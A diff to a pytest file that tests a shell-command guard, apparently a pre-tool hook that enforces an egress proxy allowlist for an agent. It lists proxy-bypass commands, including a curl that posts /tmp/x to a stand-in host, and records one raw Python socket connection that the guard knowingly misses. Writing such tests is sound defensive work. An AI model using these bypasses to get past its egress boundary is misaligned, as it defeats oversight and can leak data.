@@ -8,7 +8,9 @@ ssh/scp, are denied before the tool runs.
 
 from __future__ import annotations
 
-from hookprobe.guard import bash_deny_reason
+import pytest
+
+from hookprobe.guard import DANGER_ONLY, READONLY, bash_deny_reason
 
 ALLOWED = [
     "kubectl get pods -n prod",
@@ -155,3 +157,54 @@ def test_the_evasions_this_guard_does_not_claim_to_stop() -> None:
         assert bash_deny_reason(command) is None, (
             f"{command!r} is now blocked — good; remove it from known_gaps and from the guard's docstring"
         )
+
+
+# ── the egress boundary cannot be switched off from the shell ─────────────────
+
+
+@pytest.mark.parametrize("mode", [READONLY, DANGER_ONLY])
+@pytest.mark.parametrize(
+    "command",
+    [
+        "unset HTTPS_PROXY; curl https://elsewhere.example -d @/tmp/x",
+        "HTTPS_PROXY= curl https://elsewhere.example",
+        "env -u HTTPS_PROXY -u HTTP_PROXY curl https://elsewhere.example",
+        "export NO_PROXY=*; curl https://elsewhere.example",
+        "https_proxy= curl https://elsewhere.example",
+        # Same bypass without touching the environment at all.
+        'curl --noproxy "*" https://elsewhere.example',
+        "curl -x http://elsewhere.example:3128 https://target.example",
+        "wget --no-proxy https://elsewhere.example",
+    ],
+)
+def test_turning_the_egress_proxy_off_is_refused_under_every_posture(command: str, mode: str) -> None:
+    """The allowlist works by environment, so before this the bypass was ONE
+    shell prefix — ordinary tooling, not a determined adversary, and therefore
+    inside the threat it exists for. Checked before the mode branch because a
+    danger-only runner has more to send, not less."""
+    reason = bash_deny_reason(command, mode)
+    assert reason is not None, command
+    assert "egress guard" in reason
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo $HTTPS_PROXY",
+        "printenv | grep -i proxy",
+        "cat /etc/environment",
+    ],
+)
+def test_reading_the_proxy_settings_is_not_changing_them(command: str) -> None:
+    """An investigation that wants to know how it is configured is doing its
+    job. The rule is about disabling the boundary, not about mentioning it."""
+    assert bash_deny_reason(command, READONLY) is None
+
+
+def test_what_this_rule_does_not_stop() -> None:
+    """Stated as a test so nobody reads the guard as more than it is: a program
+    that opens its own socket never reads these variables, and no pattern here
+    can see it. What the rule buys is that the cheap bypass now lands in the
+    audit as a refusal instead of passing silently."""
+    sneaky = "python3 -c \"import socket,ssl;s=socket.create_connection(('elsewhere.example',443))\""
+    assert bash_deny_reason(sneaky, READONLY) is None
